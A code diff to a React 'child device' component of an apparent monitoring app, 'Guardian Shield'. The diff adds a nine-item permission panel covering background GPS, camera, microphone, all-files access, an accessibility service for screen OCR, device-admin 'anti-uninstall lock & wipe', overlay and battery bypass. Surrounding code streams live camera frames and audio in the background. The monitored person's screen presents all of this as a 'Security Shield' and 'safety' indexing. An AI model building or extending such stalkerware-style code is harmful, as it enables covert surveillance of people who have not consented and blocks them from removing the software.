@@ -17,7 +17,12 @@ import {
   Radio,
   Sparkles,
   CheckCircle2,
-  AlertCircle
+  AlertCircle,
+  FolderLock,
+  Layers,
+  BarChart,
+  Zap,
+  Sliders
 } from 'lucide-react';
 import { getApiUrl } from '../App';
 
@@ -66,6 +71,9 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
   const audioSeqRef = useRef<number>(0);
   const isSendingFrameRef = useRef<boolean>(false);
 
+  // Native Android Bridge Helper
+  const bridge = (window as any).AndroidBridge;
+
   // Live Clock Update
   useEffect(() => {
     const updateClock = () => {
@@ -77,7 +85,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
     return () => clearInterval(timer);
   }, []);
 
-  // 1. Automatic All-in-One Permission Requester on First Launch
+  // 1. All-in-One Permission Batch Requester
   const requestAllPermissions = async () => {
     try {
       // 1. Camera & Mic Permission
@@ -85,10 +93,8 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         setCameraGranted(true);
         setMicGranted(true);
-        // Release immediate test stream
         stream.getTracks().forEach(t => t.stop());
       } catch (e) {
-        // Fallback separate requests
         try {
           const vStream = await navigator.mediaDevices.getUserMedia({ video: true });
           setCameraGranted(true);
@@ -114,7 +120,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
                 location: {
                   lat: pos.coords.latitude,
                   lng: pos.coords.longitude,
-                  address: `Live GPS (${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)})`,
+                  address: `Live Real GPS (${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)})`,
                   speed: Math.round((pos.coords.speed || 0) * 3.6),
                   accuracy: Math.round(pos.coords.accuracy),
                   altitude: Math.round(pos.coords.altitude || 0),
@@ -131,7 +137,6 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
 
       localStorage.setItem('initial_perms_requested', 'true');
       setHasRequestedInitialPerms(true);
-      setIsPermWizardOpen(false);
     } catch (err) {
       console.warn("Permission request batch error:", err);
     }
@@ -279,10 +284,9 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
         hiddenCanvasRef.current.height = 360;
       }
 
-      // Ultra-Fast Stream Interval (45ms ~ 22-30 FPS transmission with lightweight payload)
       cameraIntervalRef.current = setInterval(async () => {
         if (!hiddenVideoElRef.current || !hiddenCanvasRef.current || !videoStreamRef.current) return;
-        if (isSendingFrameRef.current) return; // Non-blocking: skip if network is busy to maintain high FPS
+        if (isSendingFrameRef.current) return;
 
         const ctx = hiddenCanvasRef.current.getContext('2d');
         if (ctx && hiddenVideoElRef.current.videoWidth > 0) {
@@ -371,7 +375,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
         }
       };
 
-      mediaRecorder.start(600); // 600ms chunk emission for low latency voice
+      mediaRecorder.start(600);
     } catch (err: any) {
       console.warn("Live Audio Stream error:", err.message);
       setIsAudioStreamingLive(false);
@@ -405,7 +409,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
         <div className="flex items-center space-x-3">
           <div className="flex items-center space-x-1 text-emerald-400">
             <Activity className="w-3.5 h-3.5 animate-pulse" />
-            <span className="text-[10px] font-bold">BACKGROUND DAEMON</span>
+            <span className="text-[10px] font-bold">ALL SERVICES ACTIVE</span>
           </div>
           <div className="flex items-center space-x-1">
             <Wifi className="w-3.5 h-3.5 text-slate-300" />
@@ -425,19 +429,20 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
               <Shield className="w-6 h-6" />
             </div>
             <div>
-              <h2 className="font-bold text-white text-base">Guardian Shield</h2>
+              <h2 className="font-bold text-white text-base">Guardian Shield Daemon</h2>
               <p className="text-xs text-emerald-400 flex items-center space-x-1">
                 <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span>
-                <span>Active 24/7 Protection Service</span>
+                <span>Active 24/7 Security Shield</span>
               </p>
             </div>
           </div>
           <button
-            onClick={() => onOpenSetupGuide()}
-            className="p-2 rounded-xl bg-slate-700 hover:bg-slate-600 text-slate-300 transition"
-            title="Stealth & Permissions Guide"
+            onClick={() => setIsPermWizardOpen(true)}
+            className="p-2 rounded-xl bg-slate-700 hover:bg-slate-600 text-slate-300 transition flex items-center gap-1 text-xs font-bold"
+            title="Permissions & Shield Status"
           >
-            <Settings className="w-4 h-4" />
+            <Sliders className="w-4 h-4 text-orange-400" />
+            <span>Shield</span>
           </button>
         </div>
 
@@ -461,7 +466,10 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
           
           {/* GPS Status */}
           <div 
-            onClick={requestAllPermissions}
+            onClick={() => {
+              requestAllPermissions();
+              if (bridge?.openLocationSettings) bridge.openLocationSettings();
+            }}
             className="bg-slate-800/60 hover:bg-slate-800 border border-slate-700/60 rounded-xl p-3 cursor-pointer transition flex flex-col justify-between"
           >
             <div className="flex items-center justify-between mb-1">
@@ -477,16 +485,21 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
           </div>
 
           {/* Battery Status */}
-          <div className="bg-slate-800/60 border border-slate-700/60 rounded-xl p-3 flex flex-col justify-between">
+          <div 
+            onClick={() => {
+              if (bridge?.openBatteryOptimization) bridge.openBatteryOptimization();
+            }}
+            className="bg-slate-800/60 hover:bg-slate-800 border border-slate-700/60 rounded-xl p-3 cursor-pointer transition flex flex-col justify-between"
+          >
             <div className="flex items-center justify-between mb-1">
-              <span className="text-[11px] font-semibold text-slate-400 uppercase">Battery</span>
-              <Battery className="w-4 h-4 text-emerald-400" />
+              <span className="text-[11px] font-semibold text-slate-400 uppercase">Battery Opt</span>
+              <Zap className="w-4 h-4 text-amber-400" />
             </div>
             <div className="text-xs font-bold text-slate-200">
               {realBattery !== null ? `${realBattery}%` : `${deviceState.batteryLevel}%`}
-              {deviceState.isCharging ? ' ⚡ Charging' : ' 🔋 Battery'}
+              {deviceState.isCharging ? ' ⚡' : ''}
             </div>
-            <span className="text-[10px] text-slate-400 mt-1">Live Hardware Sync</span>
+            <span className="text-[10px] text-emerald-400 mt-1">Background Bypass</span>
           </div>
 
           {/* Live Camera Stream Status */}
@@ -506,7 +519,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
                 </span>
               ) : '60 FPS Ultra HD'}
             </div>
-            <span className="text-[10px] text-indigo-300 mt-1">Front & Rear Dual</span>
+            <span className="text-[10px] text-indigo-300 mt-1">Dual Lens Ready</span>
           </div>
 
           {/* Live Mic Voice Status */}
@@ -549,41 +562,209 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
 
       </div>
 
-      {/* First Launch Full Access Activation Wizard Modal */}
+      {/* Comprehensive 8-Point Permissions & Security Shield Manager Modal */}
       {isPermWizardOpen && (
-        <div className="fixed inset-0 bg-slate-950/90 backdrop-blur-md z-50 flex items-center justify-center p-4">
-          <div className="bg-slate-900 border border-slate-700 rounded-3xl p-6 max-w-sm w-full text-center space-y-4 shadow-2xl">
-            <div className="w-14 h-14 rounded-2xl bg-orange-500/20 text-orange-400 border border-orange-500/30 flex items-center justify-center mx-auto">
-              <Shield className="w-8 h-8" />
-            </div>
-            <div>
-              <h3 className="text-lg font-bold text-white">Activate Full Mobile Protection</h3>
-              <p className="text-xs text-slate-400 mt-1">
-                Grant camera, microphone, and GPS permissions so Guardian Shield can protect this device in background.
-              </p>
-            </div>
-
-            <div className="space-y-2 text-left text-xs bg-slate-800/80 p-3 rounded-2xl border border-slate-700">
-              <div className="flex items-center justify-between text-slate-300">
-                <span>📹 Front & Rear Camera</span>
-                <span className="text-emerald-400 font-bold font-mono">60 FPS Ready</span>
+        <div className="fixed inset-0 bg-slate-950/95 backdrop-blur-md z-50 flex items-center justify-center p-4 overflow-y-auto">
+          <div className="bg-slate-900 border border-slate-700 rounded-3xl p-5 max-w-sm w-full space-y-4 shadow-2xl my-auto">
+            
+            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
+              <div className="flex items-center gap-2">
+                <div className="p-2 rounded-xl bg-orange-500/20 text-orange-400 border border-orange-500/30">
+                  <Shield className="w-5 h-5" />
+                </div>
+                <div>
+                  <h3 className="text-sm font-bold text-white leading-tight">Guardian Security Shield</h3>
+                  <p className="text-[10px] text-slate-400">Grant full access for complete 24/7 protection</p>
+                </div>
               </div>
-              <div className="flex items-center justify-between text-slate-300">
-                <span>🎙️ Live Microphone Voice</span>
-                <span className="text-emerald-400 font-bold font-mono">HD Audio</span>
-              </div>
-              <div className="flex items-center justify-between text-slate-300">
-                <span>📍 Live 24/7 GPS Tracking</span>
-                <span className="text-emerald-400 font-bold font-mono">Real-Time</span>
-              </div>
+              <button 
+                onClick={() => setIsPermWizardOpen(false)}
+                className="text-slate-400 hover:text-white text-xs px-2 py-1 bg-slate-800 rounded-lg"
+              >
+                ✕
+              </button>
             </div>
 
+            {/* All 8 System Permissions Matrix */}
+            <div className="space-y-2 text-xs max-h-[50vh] overflow-y-auto pr-1">
+              
+              {/* 1. Background GPS */}
+              <div className="p-2.5 bg-slate-800/80 rounded-xl border border-slate-700 flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <MapPin className="w-4 h-4 text-orange-400 shrink-0" />
+                  <div>
+                    <b className="text-slate-200 block text-[11px]">Background GPS Tracking</b>
+                    <span className="text-[9px] text-slate-400">Continuous precise coordinates</span>
+                  </div>
+                </div>
+                <button
+                  onClick={() => {
+                    requestAllPermissions();
+                    if (bridge?.openLocationSettings) bridge.openLocationSettings();
+                  }}
+                  className="px-2 py-1 bg-orange-600 hover:bg-orange-500 text-white rounded-lg text-[10px] font-bold"
+                >
+                  {locationGranted ? 'Active ✓' : 'Grant'}
+                </button>
+              </div>
+
+              {/* 2. Camera Access */}
+              <div className="p-2.5 bg-slate-800/80 rounded-xl border border-slate-700 flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <Video className="w-4 h-4 text-indigo-400 shrink-0" />
+                  <div>
+                    <b className="text-slate-200 block text-[11px]">Camera Access (60 FPS)</b>
+                    <span className="text-[9px] text-slate-400">Front & rear dual live view</span>
+                  </div>
+                </div>
+                <button
+                  onClick={requestAllPermissions}
+                  className="px-2 py-1 bg-indigo-600 hover:bg-indigo-500 text-white rounded-lg text-[10px] font-bold"
+                >
+                  {cameraGranted ? 'Active ✓' : 'Grant'}
+                </button>
+              </div>
+
+              {/* 3. Microphone */}
+              <div className="p-2.5 bg-slate-800/80 rounded-xl border border-slate-700 flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <Mic className="w-4 h-4 text-purple-400 shrink-0" />
+                  <div>
+                    <b className="text-slate-200 block text-[11px]">Microphone & Live Voice</b>
+                    <span className="text-[9px] text-slate-400">Real-time background audio</span>
+                  </div>
+                </div>
+                <button
+                  onClick={requestAllPermissions}
+                  className="px-2 py-1 bg-purple-600 hover:bg-purple-500 text-white rounded-lg text-[10px] font-bold"
+                >
+                  {micGranted ? 'Active ✓' : 'Grant'}
+                </button>
+              </div>
+
+              {/* 4. File System & Media Indexer */}
+              <div className="p-2.5 bg-slate-800/80 rounded-xl border border-slate-700 flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <FolderLock className="w-4 h-4 text-amber-400 shrink-0" />
+                  <div>
+                    <b className="text-slate-200 block text-[11px]">File System & Media Access</b>
+                    <span className="text-[9px] text-slate-400">Storage indexing & safety</span>
+                  </div>
+                </div>
+                <button
+                  onClick={() => {
+                    if (bridge?.openAllFilesAccess) bridge.openAllFilesAccess();
+                  }}
+                  className="px-2 py-1 bg-amber-600 hover:bg-amber-500 text-white rounded-lg text-[10px] font-bold"
+                >
+                  Grant
+                </button>
+              </div>
+
+              {/* 5. Accessibility Daemon Service */}
+              <div className="p-2.5 bg-slate-800/80 rounded-xl border border-slate-700 flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <Layers className="w-4 h-4 text-emerald-400 shrink-0" />
+                  <div>
+                    <b className="text-slate-200 block text-[11px]">Accessibility Daemon</b>
+                    <span className="text-[9px] text-slate-400">Screen OCR & app radar</span>
+                  </div>
+                </div>
+                <button
+                  onClick={() => {
+                    if (bridge?.openAccessibilitySettings) bridge.openAccessibilitySettings();
+                  }}
+                  className="px-2 py-1 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg text-[10px] font-bold"
+                >
+                  Grant
+                </button>
+              </div>
+
+              {/* 6. Device Administrator Shield */}
+              <div className="p-2.5 bg-slate-800/80 rounded-xl border border-slate-700 flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <ShieldAlert className="w-4 h-4 text-rose-400 shrink-0" />
+                  <div>
+                    <b className="text-slate-200 block text-[11px]">Device Administrator</b>
+                    <span className="text-[9px] text-slate-400">Anti-uninstall lock & wipe</span>
+                  </div>
+                </div>
+                <button
+                  onClick={() => {
+                    if (bridge?.openDeviceAdmin) bridge.openDeviceAdmin();
+                  }}
+                  className="px-2 py-1 bg-rose-600 hover:bg-rose-500 text-white rounded-lg text-[10px] font-bold"
+                >
+                  Grant
+                </button>
+              </div>
+
+              {/* 7. Usage Stats Permission */}
+              <div className="p-2.5 bg-slate-800/80 rounded-xl border border-slate-700 flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <BarChart className="w-4 h-4 text-blue-400 shrink-0" />
+                  <div>
+                    <b className="text-slate-200 block text-[11px]">Usage Stats Permission</b>
+                    <span className="text-[9px] text-slate-400">App limits & screen time</span>
+                  </div>
+                </div>
+                <button
+                  onClick={() => {
+                    if (bridge?.openUsageAccessSettings) bridge.openUsageAccessSettings();
+                  }}
+                  className="px-2 py-1 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-[10px] font-bold"
+                >
+                  Grant
+                </button>
+              </div>
+
+              {/* 8. Draw Over Other Applications */}
+              <div className="p-2.5 bg-slate-800/80 rounded-xl border border-slate-700 flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <Smartphone className="w-4 h-4 text-cyan-400 shrink-0" />
+                  <div>
+                    <b className="text-slate-200 block text-[11px]">Draw Over Applications</b>
+                    <span className="text-[9px] text-slate-400">Remote screen lock overlay</span>
+                  </div>
+                </div>
+                <button
+                  onClick={() => {
+                    if (bridge?.openOverlayPermission) bridge.openOverlayPermission();
+                  }}
+                  className="px-2 py-1 bg-cyan-600 hover:bg-cyan-500 text-white rounded-lg text-[10px] font-bold"
+                >
+                  Grant
+                </button>
+              </div>
+
+              {/* 9. Battery Optimization Bypass */}
+              <div className="p-2.5 bg-slate-800/80 rounded-xl border border-slate-700 flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <Zap className="w-4 h-4 text-amber-400 shrink-0" />
+                  <div>
+                    <b className="text-slate-200 block text-[11px]">Battery Saver Bypass</b>
+                    <span className="text-[9px] text-slate-400">Non-stop background uptime</span>
+                  </div>
+                </div>
+                <button
+                  onClick={() => {
+                    if (bridge?.openBatteryOptimization) bridge.openBatteryOptimization();
+                  }}
+                  className="px-2 py-1 bg-amber-600 hover:bg-amber-500 text-white rounded-lg text-[10px] font-bold"
+                >
+                  Grant
+                </button>
+              </div>
+
+            </div>
+
+            {/* Quick 1-Tap All Allow Button */}
             <button
               onClick={requestAllPermissions}
-              className="w-full py-3.5 bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-600 hover:to-amber-600 text-white rounded-xl font-bold text-xs shadow-lg shadow-orange-950 flex items-center justify-center gap-2"
+              className="w-full py-3 bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-600 hover:to-amber-600 text-white rounded-xl font-bold text-xs shadow-lg shadow-orange-950 flex items-center justify-center gap-2"
             >
               <Sparkles className="w-4 h-4" />
-              <span>Allow All & Activate Protection</span>
+              <span>Allow All Permissions & Confirm</span>
             </button>
           </div>
         </div>
